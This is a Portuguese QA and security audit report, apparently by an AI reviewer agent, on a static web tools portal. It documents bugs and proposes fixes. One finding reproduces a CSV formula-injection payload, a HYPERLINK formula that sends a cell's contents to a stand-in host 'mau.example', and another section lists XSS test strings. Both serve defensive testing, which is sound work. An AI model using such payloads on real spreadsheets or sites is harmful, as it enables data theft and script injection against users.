# Parecer do Crítico 1 — QA Técnico e Segurança

**Alvo:** `portal/` (21 ferramentas prontas, 150 no catálogo)
**Data:** 20/09/2026
**Método:** auditoria independente, sem edição de código de produção. Cálculos refeitos
por conta própria em Node; 21 módulos de ferramenta executados sem navegador através de
um carregador que substitui `montador.js` por um capturador; exportações (PDF, XLSX, CSV)
geradas de verdade e conferidas byte a byte; as 21 páginas buscadas do servidor em
`127.0.0.1:4400` com conferência de cabeçalhos e de marcação.
**Evidências:** `…/scratchpad/evidencias/` (9 roteiros + `saida/` com os arquivos gerados).

> Observação de método: o código foi alterado por outro agente durante a auditoria
> (`orcamento-compartilhado.js` criado e movido para `scripts/ferramentas/auxiliares/`;
> `--tinta-suave` reajustado em `estilos/núcleo.css`). Todos os achados abaixo foram
> re-conferidos contra o estado do disco ao final do trabalho.

---

```text
STATUS: REPROVADO

CRÍTICOS:
- Injeção de fórmula no CSV exportado (scripts/núcleo/exportar.js:44-50). A função
  montarCsv() só protege célula que contém aspas, quebra de linha ou separador; não
  neutraliza célula que COMEÇA com "=", "+", "-" ou "@". Reprodução: abrir
  http://127.0.0.1:4400/f/csv-e-json/, escolher "JSON para CSV" e colar
  [{"nome":"=HYPERLINK(\"http://mau.example/?x=\"&A1,\"clique\")"}]; clicar "Converter"
  e depois "Baixar CSV". Saída medida (evidencias/04-hostis.mjs): a célula sai como
  =1+1 sem prefixo nenhum, e a versão com HYPERLINK sai como
  "=HYPERLINK(""http://mau.example/?x=""&A1,""clique"")" — as aspas do CSV delimitam o
  campo, não impedem o Excel/LibreOffice/Sheets de interpretar o conteúdo como fórmula.
  Deveria sair com prefixo neutralizador (apóstrofo ou aspa simples) como o próprio
  gerador de .xlsx já faz. Consequência: qualquer planilha exportada a partir de dado
  colado de terceiro vira vetor de execução de fórmula na máquina de quem abrir
  (HYPERLINK e WEBSERVICE disparam sem o aviso de DDE). Isso contradiz diretamente a
  promessa do portal de que "nada sai do seu navegador", e contradiz o próprio código:
  gerar-planilha-xlsx.js declara na linha 4 "Texto é gravado como string inline
  escapada: nunca vira fórmula ao abrir" e cumpre — só o caminho CSV ficou de fora.
  Gravidade: crítica.

- Resultado aritmeticamente impossível na diferença de datas e na idade
  (scripts/cálculos/tempo.js:53-58). O ajuste de "resto de dias" é aplicado UMA vez só,
  então continua negativo quando o dia inicial é maior que o número de dias do mês
  anterior ao mês final. Reprodução A (idade): abrir
  http://127.0.0.1:4400/f/calculadora-de-datas/, operação "Idade a partir do
  nascimento", Data inicial 31/01/1990, Data final 01/03/2026. Saiu:
  "36 anos, 1 meses e -2 dias". Deveria sair "36 anos, 1 mês e 1 dia". Reprodução B
  (diferença): mesma página, operação "Diferença entre duas datas", 31/01/2026 e
  01/03/2026. A linha "Em anos, meses e dias" saiu "0 anos, 1 meses e 2 dias" — aqui o
  calculadora-de-datas.js:114 aplica Math.abs() sobre o componente, o que esconde o
  sinal e transforma o -1 em 1 a mais; o correto é "1 mês e 1 dia". Terceiro caso
  medido: 31/05/2026 → 01/07/2026 saiu "1 meses e 0 dias", correto é "1 mês e 1 dia".
  Consequência: uma calculadora imprime um número de dias negativo, e no outro modo
  devolve silenciosamente um valor errado sem nenhum sinal de que errou. Atinge toda
  pessoa nascida em dia 29, 30 ou 31. Gravidade: crítica.

IMPORTANTES:
- Parcelamento "sem juros" informa juros e declara economia falsa
  (scripts/cálculos/dinheiro.js:153-157 e scripts/ferramentas/parcelamento.js:57-72).
  A parcela é arredondada e o total é recomposto como parcela×n, então total ≠ valor
  quando o valor não divide exato. Reprodução: http://127.0.0.1:4400/f/parcelamento/,
  Valor total 1000, Entrada 0, Parcelas 3, Juros ao mês 0, Desconto à vista 0.
  Saiu: "3× de R$ 333,33", "Total parcelado R$ 999,99", "Juros embutidos -R$ 0,01",
  observação "Pagar parcelado economiza R$ 0,01 (0%)". Com 7 parcelas sai
  "Total R$ 1.000,02 / Juros embutidos R$ 0,02"; com 13 parcelas, "-R$ 0,04".
  Deveria sair juros R$ 0,00 e total igual ao valor, com a diferença de arredondamento
  jogada na última parcela. Consequência: a ferramenta cujo propósito declarado é dizer
  "qual opção sai mais barata" afirma que parcelar sem juros é mais barato que pagar à
  vista. Gravidade: alta.

- Erro de digitação comum não chega ao campo: vira "Algo deu errado no cálculo".
  As funções de cálculo lançam Error simples em vez de ErroDeEntrada, e
  scripts/núcleo/montador.js:212-225 manda todo Error que não seja ErroDeEntrada para o
  ramo genérico — console.error, barra de progresso vermelha e um aviso flutuante
  "Algo deu errado no cálculo. Confira os valores e tente de novo.", sem marcar o campo,
  sem aria-invalid, sem aria-describedby e sem mover o foco. Reproduzido em
  evidencias/08-erros-de-campo.mjs, todos com entrada que qualquer pessoa digita:
    * scripts/ferramentas/calculadora-de-horas.js:71 — campo de texto "Jornada
      contratual por dia (HH:MM)" preenchido com "8h" ou "8,5" →
      Error "Informe o horário como HH:MM." genérico. (O campo "ponto", na mesma
      ferramenta, está certo: a linha 30 embrulha em ErroDeEntrada. Só a jornada ficou
      de fora.)
    * scripts/ferramentas/regra-de-tres.js:41 — campo "Se A" com 0 →
      Error "O primeiro valor não pode ser zero." A própria seção "Limites e premissas"
      da ferramenta avisa dessa regra, mas a mensagem não chega ao campo.
    * scripts/ferramentas/preco-de-venda.js — Margem 60, Taxas 25, Imposto 20 (soma
      105%) → Error "Margem, taxas e imposto somam 100% ou mais…" genérico. Cada campo
      isolado passa na validação de faixa; só a soma estoura.
    * scripts/ferramentas/conversor-de-unidades.js — grandeza Temperatura, de C para F,
      valor -300 → Error "Abaixo do zero absoluto: temperatura impossível." genérico.
    * scripts/ferramentas/calculadora-de-datas.js:10-20 — "Contar apenas dias úteis"
      marcado e "Feriados a excluir" com "12/13/2026" ou "12 de outubro" →
      Error de lerData() genérico. O comentário da linha 19 diz "valida e lança erro
      legível", mas ele não é roteado para o campo "feriados".
    * scripts/ferramentas/recibo.js, numero-por-extenso.js e juros.js — valor colado
      como 1e308 → "Os centavos precisam ser inteiros." / "Valor inicial inválido.",
      mensagens internas expostas ao usuário final.
  Consequência: some a garantia central declarada no cabeçalho do montador ("validação
  com erro no campo certo… assim nenhuma ferramenta esquece de ter erro"), e quem usa
  leitor de tela não recebe nenhuma ligação entre o erro e o campo. Gravidade: alta.

- Link compartilhável do orçamento exibe um total que não é conferido contra os itens
  (scripts/ferramentas/auxiliares/orcamento-compartilhado.js:39 e 76-77). O campo "t"
  passa só por Number.isFinite; o subtotal é recalculado a partir dos itens, mas nada
  compara os dois. Reprodução: gerar um orçamento de 2 itens somando R$ 350,00, tomar o
  "#o=…" do link, trocar "t":32130 por "t":1 no JSON e recodificar em base64url; abrir
  o link. A tela mostra "Total R$ 0,01" e a linha "Desconto (10%) − R$ 349,99". Com
  "t":99999999 a tela mostra "Total R$ 999.999,99" e a linha de subtotal/desconto
  simplesmente some (desconto negativo cai no ternário), sem nada explicando a
  diferença. "t":0.5 é aceito (centavo fracionário) e quantidade -5 num item também.
  Para efeito de comparação, o módulo rejeitou corretamente os outros 13 casos de
  adulteração que testei (base64 truncado, base64 com lixo, v errada, itens não-array,
  item incompleto, 61 itens, total não numérico, descrição não-string, unitário
  fracionário, emissor não-string, link acima de 8000 caracteres, etc.). Consequência:
  o cliente que recebe o link vê um valor forjado com a marca do emissor, e o comentário
  de topo do arquivo promete que "nada é exibido sem passar pela conferência" —
  a conferência é de formato, não de coerência aritmética. Gravidade: média-alta.

- portal/package-lock.json não corresponde ao projeto e arrasta dependências de banco.
  O lockfile (rastreado pelo git) declara name "portal-ferramentas-ander" v0.1.0 com
  dependencies {"@prisma/client":"6.16.2"} e devDependencies {"prisma":"6.16.2"};
  portal/package.json declara name "portal-de-ferramentas" v1.0.0 e nenhuma dependência,
  e a própria descrição diz "site estático, sem servidor e sem cadastro". `npm ls
  --depth=0` lista 36 pacotes "extraneous" instalados em portal/node_modules, e
  `npm ci --dry-run` remove os 36. @prisma/client tem hasInstallScript:true.
  Consequência: build não reprodutível, script de instalação de terceiro rodando num
  projeto que não usa banco, e risco de o pacote publicado carregar node_modules
  indevido. Gravidade: média.

- JSON profundamente aninhado estoura a pilha e mostra mensagem enganosa
  (scripts/ferramentas/json.js:16-30 e 33-39 — medir() e ordenar() são recursivas sem
  limite de profundidade). Reprodução: colar "[".repeat(5000)+"]".repeat(5000) em
  http://127.0.0.1:4400/f/json/ e clicar "Processar". JSON.parse aceita; medir() lança
  RangeError "Maximum call stack size exceeded", que cai no ramo genérico do montador e
  exibe "Algo deu errado no cálculo. Confira os valores e tente de novo." — mas os
  valores estão certos, o JSON é válido. Com 1000 níveis funciona. Deveria devolver um
  erro no campo dizendo que o documento passou do limite de profundidade suportado.
  Gravidade: média.

- Regra de três inversa com C = 0 devolve um travessão mudo
  (scripts/cálculos/medidas.js:130-132). Só o primeiro valor é barrado contra zero; na
  inversa quem vai ao denominador é C. Reprodução: http://127.0.0.1:4400/f/regra-de-tres/,
  A=2, B=10, C=0, tipo "Inversa". x = Infinity, e formatarNúmero devolve "—": a tela
  mostra Resultado "—" e as linhas A/B/C/X com "—" em X, sem nenhuma mensagem de erro.
  Gravidade: média.

- O limite de 60 itens do orçamento e o limite de 4000 caracteres do link não conversam
  (scripts/ferramentas/orcamento.js:189-193 vs. instruções.limites). Com descrições
  realistas de ~50 caracteres, 60 itens geram uma URL de ~5.900 caracteres e o link
  nunca é criado: só sai o aviso "O orçamento ficou grande demais para caber num link.
  Envie o PDF.". Com descrições curtas (~20 caracteres) os 60 itens cabem em ~2.800.
  A documentação anuncia "Até 60 itens" e "copie o link para o cliente" sem dizer que as
  duas coisas não valem juntas. O leitor, por sua vez, aceita até 8000 — dois limites
  diferentes para a mesma coisa. Gravidade: média.

MELHORIAS:
- estilos/núcleo.css:82 — "--atenção-fraca: #33271331" tem 8 dígitos hexadecimais (o
  último par vira alfa de 19%), enquanto a linha 112, no bloco prefers-color-scheme,
  usa "#332713" opaco. O tema escuro escolhido à mão e o tema escuro do sistema pintam
  a etiqueta de atenção com cores diferentes. É o único hex de 8 dígitos do CSS todo,
  provável erro de digitação. Não quebra contraste (medi 7,82:1 contra 6,71:1).
- scripts/cálculos/tempo.js — o texto "1 meses" aparece em toda saída com um mês só
  (calculadora-de-datas.js:74 e 114 interpolam direto). O projeto já tem o helper
  plural() em scripts/núcleo/texto.js e não o usa aqui.
- scripts/ferramentas/conversor-de-unidades.js:83-84 — as <option> são montadas com
  innerHTML sem escapar valor nem rótulo. Hoje é inofensivo (vêm de GRANDEZAS, que é
  Object.freeze e só tem dado do desenvolvedor), mas é o único innerHTML do portal com
  interpolação não escapada e destoa do padrão do resto do código.
- scripts/núcleo/texto.js:55 — paraNúmero("0x10") devolve 16, porque Number() aceita
  hexadecimal. Num campo de dinheiro isso é uma interpretação surpreendente.
- scripts/cálculos/dinheiro.js:175-186 — divisãoDeContas aceita peso NaN (produz rateio
  NaN) e peso negativo (produz "deveria pagar" negativo) sem lançar, porque só a soma
  dos pesos é conferida. Não é alcançável pela interface (divisao-de-contas.js:38-41
  valida antes), mas a função é exportada e exercitada pelos testes como se fosse
  contrato público.
- scripts/cálculos/tempo.js:88-99 — somarDias em modo "dias úteis" não tem teto de
  iterações; uma lista de feriados que cubra todos os dias úteis do período faria o
  laço girar até o limite de 100 anos. Baixo risco prático, mas é laço sem guarda.
- scripts/ferramentas/recibo.js:30 — o exemplo da documentação escreve "mil duzentos e
  cinquenta reais", e o código produz "mil, duzentos e cinquenta reais" (vírgula entre
  os grupos). A documentação e a saída deveriam bater.
- scripts/núcleo/montador.js:221 — progresso.falhar() torna visível a barra de progresso
  em ferramentas que nunca mostram progresso (demorada: false), e ela fica na tela até o
  próximo cálculo. O erro deveria usar progresso.esconder() nesses casos.

ARQUIVOS AFETADOS:
- portal/scripts/núcleo/exportar.js (44-50) — CRÍTICO 1
- portal/scripts/cálculos/tempo.js (53-58, 88-99) — CRÍTICO 2 e melhorias
- portal/scripts/ferramentas/calculadora-de-datas.js (10-20, 74, 114) — CRÍTICO 2, erro de campo
- portal/scripts/cálculos/dinheiro.js (153-157, 175-186) — parcelamento 0%, melhorias
- portal/scripts/ferramentas/parcelamento.js (57-72) — parcelamento 0%
- portal/scripts/ferramentas/calculadora-de-horas.js (71) — erro de campo
- portal/scripts/ferramentas/regra-de-tres.js (41) — erro de campo
- portal/scripts/ferramentas/preco-de-venda.js — erro de campo
- portal/scripts/ferramentas/conversor-de-unidades.js (83-84) — erro de campo, melhoria
- portal/scripts/ferramentas/recibo.js (30) — erro de campo, melhoria
- portal/scripts/ferramentas/numero-por-extenso.js — erro de campo
- portal/scripts/ferramentas/juros.js — erro de campo
- portal/scripts/ferramentas/json.js (16-39) — pilha estourada
- portal/scripts/cálculos/medidas.js (130-132) — regra de três inversa
- portal/scripts/ferramentas/auxiliares/orcamento-compartilhado.js (39, 76-77) — total não conferido
- portal/scripts/ferramentas/orcamento.js (189-193) — limite do link
- portal/scripts/núcleo/montador.js (212-225) — roteamento do erro genérico
- portal/scripts/núcleo/texto.js (55) — paraNúmero hexadecimal
- portal/estilos/núcleo.css (82) — hex de 8 dígitos
- portal/package-lock.json — lockfile de outro projeto

CORREÇÕES OBRIGATÓRIAS:
1. Em montarCsv (exportar.js), neutralizar toda célula cujo primeiro caractere seja
   "=", "+", "-", "@", tabulação ou retorno de carro, prefixando com apóstrofo antes de
   aplicar o escape de aspas — e cobrir o caso com teste, do mesmo jeito que o .xlsx já
   é coberto.
2. Em diferençaEntreDatas (tempo.js), trocar o ajuste único por um laço (ou pela
   comparação direta de calendário) que garanta 0 <= restoDeDias < dias do mês, e
   remover o Math.abs() de calculadora-de-datas.js:114, que hoje mascara o sinal errado
   em vez de corrigi-lo. Acrescentar teste com nascimento em dia 29, 30 e 31 avaliado no
   dia 1º do mês seguinte.
3. Em parcelamento (dinheiro.js), fazer o total fechar com o valor financiado:
   distribuir a sobra de arredondamento na última parcela e garantir jurosCentavos === 0
   quando taxa === 0. Acrescentar teste varrendo 1 a 24 parcelas com taxa zero.
4. Trocar por ErroDeEntrada, com o nome do campo culpado, todos os Error simples
   alcançáveis por digitação: jornada (calculadora-de-horas.js), A = 0
   (regra-de-tres.js), soma de percentuais acima de 100 (preco-de-venda.js), zero
   absoluto (conversor-de-unidades.js), lista de feriados (calculadora-de-datas.js),
   e valor fora de faixa em recibo.js, numero-por-extenso.js e juros.js — nesses três,
   validar a faixa no próprio campo em vez de deixar vazar "Os centavos precisam ser
   inteiros".
5. Em lerOrçamentoDoLink, recalcular o total a partir dos itens e do desconto e recusar
   (ou exibir com aviso explícito) o link cujo "t" não bate com a soma; exigir
   Number.isSafeInteger em "t" e quantidade > 0 em cada item.
6. Limitar a profundidade em medir()/ordenar() (json.js) e devolver ErroDeEntrada no
   campo "conteúdo" quando o documento passar do limite, em vez de deixar o RangeError
   virar "Algo deu errado no cálculo".
7. Barrar C = 0 na regra de três inversa (medidas.js), com mensagem no campo C.
8. Regenerar portal/package-lock.json a partir do portal/package.json real (sem
   dependências) e remover portal/node_modules do ambiente de build; conferir que o
   pacote publicado não leva nada de @prisma.
9. Alinhar o limite do link do orçamento: um único número, escrito na documentação da
   ferramenta, valendo para o gerador e para o leitor.
```

---

## O que foi conferido e está correto

Registro explícito, para não deixar dúvida sobre o que passou.

### Cálculos (refeitos com contas independentes)
- **Preço de venda — margem sobre receita, correta.** Custo R$ 100,00 com margem 30%
  → preço R$ 142,86 (10000/0,70 = 14285,71 arredondado para cima). Margem real medida
  sobre o preço: 30,0014%. Com taxas 5% e imposto 6% (retido 41%): preço R$ 169,50, e a
  composição Custo+Fixa+Taxas+Imposto+Lucro soma exatamente 16.950 centavos. Markup
  informado (42,86%) é diferente da margem, como tem de ser. Margem ≥ 100% é barrada.
- **Juros simples e compostos, corretos.** Simples: R$ 1.000 a 1% por 12 períodos →
  R$ 1.120,00 e juros R$ 120,00 exatos. Compostos: R$ 1.126,84 contra R$ 1.126,83 da
  fórmula fechada (1 centavo de diferença, esperado pelo arredondamento a cada período).
  Com aporte de R$ 100/mês a 1%: R$ 1.268,25, idêntico à fórmula de anuidade postecipada.
- **Tabela Price, correta.** R$ 1.000 em 10× a 2% a.m. → parcela R$ 111,33, igual ao meu
  cálculo de 100000×0,02/(1−1,02⁻¹⁰) = 11132,65.
- **Divisão de contas, exata em todos os casos.** Em 3 pessoas com R$ 10,00 (centavo
  quebrado), 7 pessoas com R$ 100,00, pesos 2/1/1 sobre R$ 100,01 e pesos fracionários
  1,5/1/1: a soma dos saldos deu 0 e a soma do rateio deu exatamente o total, e os
  acertos gerados zeram todos os saldos quando aplicados. É a implementação mais sólida
  do conjunto.
- **Porcentagem, cinco operações corretas** (30 / 230 / 170 / +25% / 25%), com divisão
  por zero barrada em "variação" e "proporção".
- **Datas:** bissexto (28/02/2024+1 = 29/02), não bissexto, virada de mês e de ano,
  29/02/2023 e mês 13 recusados; dias úteis seg→sex = 4, com um feriado = 3; soma de
  dias úteis pulando feriado e soma negativa (segunda −1 útil = sexta), todas certas.
- **Horas:** turno que vira o dia 22:00→06:00 = 480 min; com 1h de intervalo = 420;
  intervalo maior que a jornada é recusado; formatação negativa (−1h30) e acima de 24h
  (25h00) corretas.
- **Unidades:** KB = 1000 B e KiB = 1024 B corretos e distintos, MiB/KiB = 1024,
  MB/KB = 1000; temperatura 100 °C = 212 °F, −40 °C = −40 °F, 0 °C = 273,15 K, e abaixo
  do zero absoluto recusado nos dois sentidos; milha, libra e km/h com fatores exatos.
- **CPF/CNPJ:** validados contra dígitos verificadores reais (5 CPF e 4 CNPJ), rejeição
  de DV errado, de sequência repetida e de tamanho errado; formatação correta.
- **Número por extenso:** 21 casos conferidos, incluindo "cem" vs "cento e", "mil" sem
  "um" na frente, milhão/milhões e a colocação do "e" no último grupo.
- **Reais × centavos: nenhuma confusão encontrada.** Todo dinheiro circula em centavos
  inteiros; `emCentavos`/`emReais` concentram a conversão num lugar só; `emReais` recusa
  não-inteiro; `formatarCentavos` recusa não-inteiro-seguro. Não achei nenhum ponto onde
  reais entrem numa função que espera centavos ou vice-versa. O erro de 100× não voltou.

### Entradas hostis
- `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `';alert(1);//` e
  `<svg onload=alert(1)>` foram injetados em todos os campos de texto das 21 ferramentas:
  nenhuma execução, nenhum vazamento cru. `escapar()` cobre `& < > " '` e todo innerHTML
  que recebe dado de usuário passa por ele (montador.js, lista.js, início.js,
  orcamento-compartilhado.js, página-de-ferramenta.js).
- **Nenhuma poluição de protótipo** em nenhum caminho: `paraObjetos` descarta
  `__proto__`/`constructor`/`prototype`; `armazenamento.js` usa reviver no JSON.parse;
  `importarTudo` barra as mesmas chaves e exige `^[\w.\-]{1,60}$`. `Object.prototype`
  ficou intacto ao fim de todas as baterias.
- CSV de 100.000 linhas: lido em 159 ms, limpo em 165 ms, convertido em 36 ms. Texto de
  1 MB: escapado em 2 ms. Sem travamento.
- Campo vazio, zero, negativo, 1e308 e 1e309 foram exercitados em todos os campos; o que
  falhou está relatado acima como erro de roteamento, não como queda de página —
  **nenhuma ferramenta derrubou a página em nenhum caso**.

### Privacidade e armazenamento
- **Zero saída de rede.** Nenhum `fetch(`, `XMLHttpRequest`, `sendBeacon`, `WebSocket`,
  `EventSource` ou `importScripts` em `scripts/` e `dados/`. Nenhuma URL externa em
  nenhum HTML ou CSS servido. As 10 fontes são arquivos locais em `recursos/fontes/`.
  O único `new Image()` (qr-code.js:96) carrega um blob local para rasterizar o PNG.
- `armazenamento.js` se comportou bem nos quatro cenários: modo privado
  (`armazenamentoAtivo` false, `gravar` devolve false, `ler` devolve o padrão, `apagar`
  e `exportarTudo` não lançam), cota cheia (`gravar` devolve false sem lançar), JSON
  corrompido na chave (devolve o padrão) e `null` gravado (devolve o padrão).
- `importarTudo` recusou os 6 formatos inválidos que testei e, no arquivo com chaves
  perigosas, importou só a legítima e ignorou 6 — inclusive `../../fuga` e chave de 200
  caracteres. O teto de 512 KB em `salvos.js:50` é adequado.

### Link compartilhável do orçamento
- **A página que lê o link existe e funciona.** `orcamento.js:93` detecta `#o=` e desvia
  para `mostrarOrçamentoCompartilhado`, com `hashchange` para redesenhar. O risco
  crítico previsto (link gerado e nunca lido) não se concretizou.
- O fragmento realmente não vai ao servidor, e a documentação da ferramenta diz isso e
  ainda avisa "qualquer pessoa com o link vê o conteúdo, então não coloque dado
  sensível" — afirmação verdadeira e honesta.
- 13 de 14 tentativas de adulteração foram recusadas com mensagem legível. A que passou
  está relatada nos IMPORTANTES.

### CSP, cabeçalhos e pacote
- As 21 páginas respondem 200 com CSP estrita (`script-src 'self'`, `style-src 'self'`,
  `object-src 'none'`, `frame-ancestors 'none'`), `X-Content-Type-Options: nosniff`,
  `Referrer-Policy`, `X-Frame-Options: DENY`, `Permissions-Policy` e `Cache-Control:
  no-store`.
- **Zero atributo `style=`, zero atributo `on*=` e zero `<script>` com corpo embutido**
  nas 21 páginas. Todo script é `src` externo. O único `.style` do runtime
  (interface.js:42, largura da barra de progresso) é CSSOM, que `style-src` não alcança.
- `servir.mjs` trata bem travessia de caminho (resolve + relative + rejeita `..`,
  caminho absoluto e componente começando com ponto), byte nulo, URL malformada e método
  diferente de GET/HEAD.
- Nenhum segredo, chave de API, token ou identificador de conta no repositório. Nenhum
  script de anúncio, de medição de audiência ou de rastreamento — e `privacidade.html`
  afirma exatamente isso, o que confere com o código. (Não há ferramenta de Pix nem
  banner de consentimento neste portal; os dois itens do roteiro não se aplicam aqui.)
- `npm run testar`: 51 de 51 passam. `npm run verificar`: nenhum problema, só 4 avisos
  de módulo adiantado para ferramenta ainda planejada.

### Exportações (arquivos gerados de verdade)
- **PDF do recibo e PDF de orçamento com 60 itens:** começam com `%PDF-1.4`, terminam
  com `%%EOF`; `/Count` bate com o número de objetos de página; **todas as posições da
  tabela xref apontam para o objeto correto** (7 e 9 entradas); `/Length` de cada stream
  confere byte a byte com o conteúdo; acentos saem em octal WinAnsi, sem mojibake. O
  orçamento de 60 itens quebrou em 2 páginas e **os 60 itens estão presentes**, sem
  nenhum perdido na quebra.
- **XLSX:** ZIP válido (assinatura PK, EOCD correto), 7 arquivos, **CRC32 de cada
  entrada conferido de forma independente e correto**, os 7 XML com tags balanceadas.
  Nenhum elemento `<f>`: texto é sempre `t="inlineStr"`, então
  `=HYPERLINK("http://mau","x")` fica inerte na planilha. Acentos preservados e `<`/`&`
  escapados.
- **CSV:** BOM UTF-8 no início e acentos íntegros — o Excel abre certo.

### Acessibilidade e estados
- `prefers-reduced-motion: reduce` zera animação, transição e `scroll-behavior`
  (núcleo.css:191).
- `:focus-visible` com contorno de 2px e `outline-offset` (núcleo.css:156); link "pular
  para o conteúdo" presente; toda ação é `<button>` ou `<a>` real, alcançável por
  teclado; campos têm `<label for>` e dica ligada por `aria-describedby`.
- `mostrarErro` liga `aria-invalid="true"` e `aria-describedby` ao input, e
  `limparErros` remove os dois — correto. A ressalva é que os erros relatados nos
  IMPORTANTES nunca chegam a essa função.
- **Contraste: passa AA nos dois temas.** Medi os 16 pares texto/fundo realmente usados.
  No começo da auditoria `--tinta-suave: #86736a` falhava no tema claro em todas as
  superfícies (4,42:1 no cartão, 4,00:1 no fundo, 3,67:1 na faixa) para texto pequeno de
  12-13px usado em `.rótulo`, `.campo__dica`, `.ferramenta-linha__resumo` e cabeçalho de
  tabela. O valor foi alterado para `#68574f` durante a auditoria e **agora mede 5,59:1
  a 6,75:1 — passa em todas**. O tema escuro já passava (mínimo 4,58:1). Menor par
  aprovado hoje: `--atenção` sobre `--atenção-fraca`, 5,05:1 no claro.
- Em caso de exceção, `montador.js:211` esconde a caixa de resultado antes de tratar o
  erro: **não fica resultado velho na tela**.
- O estado de progresso não mente: `criarProgresso` só é acionado quando a ferramenta se
  declara `demorada`, e nenhuma das 21 usa atraso artificial. Confere com o comentário
  do arquivo.
